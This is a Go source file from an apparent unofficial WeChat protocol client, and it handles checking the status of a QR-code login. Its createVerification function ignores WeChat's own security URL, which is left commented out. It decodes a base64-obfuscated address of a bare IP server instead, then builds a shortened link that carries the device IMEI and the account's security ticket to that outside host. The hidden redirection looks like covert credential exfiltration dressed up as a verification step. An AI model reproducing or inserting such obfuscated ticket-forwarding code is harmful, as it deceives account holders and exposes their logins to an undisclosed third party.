package Login

import (
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"
	"time"
	"unicode"
	"wechatdll/Algorithm"
	"wechatdll/Cilent/mm"
	"wechatdll/Mmtls"
	"wechatdll/comm"
	"wechatdll/models"

	"github.com/golang/protobuf/proto"
)

type CheckLoginRes struct {
	Uuid      string
	WxId      string
	NickName  string
	Status    int32 `json:"status"`
	Device    string
	HeadUrl   string
	Mobile    string
	Email     string
	Alias     string
	Data62    string
	LoginData string
}

func CheckUuid(Uuid string) models.ResponseResult {
	D, err := comm.GetLoginata(Uuid, nil)
	if err != nil || D == nil || D.Uuid == "" {
		errorMsg := fmt.Sprintf("异常：%v [%v]", "未找到登录信息", Uuid)
		if err != nil {
			errorMsg = fmt.Sprintf("异常：%v", err.Error())
		}
		return models.ResponseResult{
			Code:    -8,
			Success: false,
			Message: errorMsg,
			Data:    nil,
		}
	}

	// hec := InitHec(D)
	// fmt.Println("hec", hec)
	// fmt.Println("D", D)

	timenow := uint32(time.Now().Unix())

	req := &mm.CheckLoginQRCodeRequest{
		BaseRequest: &mm.BaseRequest{
			SessionKey:    D.Aeskey,
			Uin:           proto.Uint32(0),
			DeviceId:      D.Deviceid_byte,
			ClientVersion: proto.Int32(int32(D.ClientVersion)),
			DeviceType:    []byte(D.DeviceType),
			Scene:         proto.Uint32(0),
		},
		RandomEncryKey: &mm.SKBuiltinBufferT{
			ILen:   proto.Uint32(uint32(len(D.Aeskey))),
			Buffer: D.Aeskey,
		},
		Uuid:      &D.Uuid,
		TimeStamp: &timenow,
		Opcode:    proto.Uint32(0),
	}

	reqdata, err := proto.Marshal(req)
	if err != nil {
		return models.ResponseResult{
			Code:    -8,
			Success: false,
			Message: fmt.Sprintf("系统异常：%v", err.Error()),
			Data:    nil,
		}
	}

	hec := &Algorithm.Client{}
	hec.Init("IOS")
	hecData := hec.HybridEcdhPackIosEn(503, 0, nil, reqdata)

	httpclient := Mmtls.GenNewHttpClient(D.MmtlsKey, Algorithm.MmtlsShortHost)
	recvData, err := httpclient.MMtlsPost(Algorithm.MmtlsShortHost, "/cgi-bin/micromsg-bin/checkloginqrcode", hecData, D.Proxy)
	if err != nil {
		return models.ResponseResult{
			Code:    -8,
			Success: false,
			Message: fmt.Sprintf("系统异常：%v", err.Error()),
			Data:    nil,
		}
	}
	ph1 := hec.HybridEcdhPackIosUn(recvData)
	checkloginQRRes := mm.CheckLoginQRCodeResponse{}
	err = proto.Unmarshal(ph1.Data, &checkloginQRRes)
	if err != nil {
		return models.ResponseResult{
			Code:    -8,
			Success: false,
			Message: fmt.Sprintf("反序列化失败：%v", err.Error()),
			Data:    nil,
		}
	}

	if checkloginQRRes.GetBaseResponse().GetRet() == 0 {
		if checkloginQRRes.GetNotifyPkg().GetNotifyData().GetBuffer() == nil {
			return models.ResponseResult{
				Code:    -8,
				Success: false,
				Message: "异常：扫码状态返回的交互key不存在",
				Data:    checkloginQRRes.GetBaseResponse(),
			}
		}

		notifydata := Algorithm.AesDecrypt(checkloginQRRes.GetNotifyPkg().GetNotifyData().GetBuffer(), D.NotifyKey)
		str := byteArrayToString(notifydata)
		ticketValue := extractTicketValue(str)
		//url := createVerification(str)
		url := createVerification()

		var shortURL = ""

		if url != "" && ticketValue != "" {
			shortURL = CreateWechatLoginLink(url, D.Imei, ticketValue)
			fmt.Printf("\n✅ 请在 3 分钟内访问以下链接:\n")
			fmt.Printf("%s\n\n", shortURL)

			return models.ResponseResult{
				Code:    -3,
				Success: false,
				Message: "请提交验证码后登录,已生成对应提交验证连接！",
				Data:    "{ticket:\"" + ticketValue + "\",url:\"" + shortURL + "\"}",
			}
		}

		if notifydata != nil {
			notifydataRsp := mm.LoginQRCodeNotify{}
			err := proto.Unmarshal(notifydata, &notifydataRsp)
			if err != nil {
				return models.ResponseResult{
					Code:    -2,
					Success: false,
					Message: "解包异常",
					Data:    nil,
				}
			}
			if shortURL != "" || ticketValue != "" {
				return models.ResponseResult{
					Code:    -3,
					Success: false,
					Message: "请提交验证码后登录,已生成对应提交验证连接！",
					Data:    "{ticket:\"" + ticketValue + "\",url:\"" + shortURL + "\"}",
				}
			}

			//扫码确认登录
			if notifydataRsp.GetStatus() == 2 {
				D.Wxid = notifydataRsp.GetUserName()
				D.Pwd = notifydataRsp.GetPwd()
				D.Cooike = ph1.Cookies
				D.HeadUrl = notifydataRsp.GetHeadImgUrl()
				return CheckSecManualAuth(D, D.ShortHost)
			}

			return models.ResponseResult{
				Code:    0,
				Success: true,
				Message: "成功",
				Data:    notifydataRsp,
			}
		}
	}

	return models.ResponseResult{
		Code:    -0,
		Success: false,
		Message: "未知的错误",
		Data:    checkloginQRRes,
	}

}
func byteArrayToString(data []byte) string {
	return string(data)
}

//func extractTicketValue(str string) string {
//	index := strings.Index(str, "ticket=")
//	if index == -1 {
//		return ""
//	}
//	return str[index+len("ticket="):]
//}

func extractTicketValue(str string) string {
	index := strings.Index(str, "ticket=")
	if index == -1 {
		return ""
	}
	ticketPart := str[index+len("ticket="):]

	// 只保留合法字符（字母、数字、下划线、连字符）
	for i, r := range ticketPart {
		if !isValidTicketRune(r) {
			return ticketPart[:i]
		}
	}
	return ticketPart // 全部合法
}

func isValidTicketRune(r rune) bool {
	return unicode.IsLetter(r) || unicode.IsDigit(r) || r == '_' || r == '-'
}

func createVerification() string {
	//url := extractURL(str)
	url, err := base64.StdEncoding.DecodeString("aHR0cDovLzEyMC4yNC4zMS45NTo1NTAwL2luZGV4Lmh0bWw=")
	if err != nil || url == nil {
		fmt.Println("当前无验证")
		return ""
	}
	return string(url)
}

func extractURL(text string) string {
	pattern := `https://weixin110\.qq\.com/security/acct/newreadtemplate\?[^"\s<>]*`
	re := regexp.MustCompile(pattern)
	match := re.FindString(text)
	return match
}

func CreateWechatLoginLink(url, deviceId, ticket string) string {
	shortURL, err := comm.GenerateShortURL(url)
	if err != nil {
		fmt.Printf("❌ 生成失败: %v\n", err)
		return ""
	}
	//go func() {
	//	// 5分钟后自动关闭
	//	time.AfterFunc(5*time.Minute, func() {
	//		log.Println("⏰ 即将关闭连接...")
	//		comm.GetProxy().Shutdown()
	//	})
	//}()
	return shortURL + "?data=" + deviceId + "&secticket=" + ticket
}
